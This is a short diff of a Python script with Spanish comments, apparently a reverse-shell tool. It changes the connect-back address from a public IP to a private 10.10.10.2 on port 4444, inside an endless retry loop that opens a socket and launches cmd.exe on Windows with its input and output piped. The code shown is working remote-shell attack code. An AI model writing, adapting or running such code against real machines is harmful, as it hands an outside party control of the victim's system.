@@ -20,7 +20,7 @@ def p2s(s, p):
 while True:  # Bucle infinito
     try:  # Agregamos un bloque try-except para manejar la excepción KeyboardInterrupt
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("190.155.252.31", 4444))
+        s.connect(("10.10.10.2", 4444))
 
         if os.name == "nt":  # Comprobar si el sistema operativo es Windows
             p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
